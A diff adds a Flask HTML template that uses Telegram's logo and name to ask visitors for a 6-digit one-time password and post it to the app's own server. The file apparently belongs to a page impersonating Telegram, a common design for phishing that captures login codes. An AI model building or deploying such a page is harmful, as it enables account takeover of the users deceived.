@@ -1,0 +1,39 @@
+<!-- templates/otp_form.html -->
+
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram OTP Input</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <div class="container">
+        <!-- Telegram Logo -->
+        <div style="text-align: center; margin-bottom: 20px;">
+            <img src="{{ url_for('static', filename='telegram-logo.png') }}" alt="Telegram Logo" width="60" height="60">
+        </div>
+        <div class="title">Enter Telegram OTP</div>
+        <form action="{{ url_for('submit_otp') }}" method="post">
+            <div class="form-group">
+                <label for="otp">One-Time Password (OTP)</label>
+                <input type="text" name="otp" id="otp" placeholder="Enter the 6-digit OTP" required aria-label="One-Time Password" maxlength="6" pattern="\d{6}" title="Please enter a valid 6-digit OTP.">
+            </div>
+            <input type="submit" value="Submit">
+        </form>
+    </div>
+
+    <!-- Client-Side Validation Script -->
+    <script>
+        document.querySelector('form').addEventListener('submit', function(e) {
+            const otp = document.getElementById('otp').value.trim();
+            const otpPattern = /^\d{6}$/;
+            if (!otpPattern.test(otp)) {
+                alert('Please enter a valid 6-digit OTP.');
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
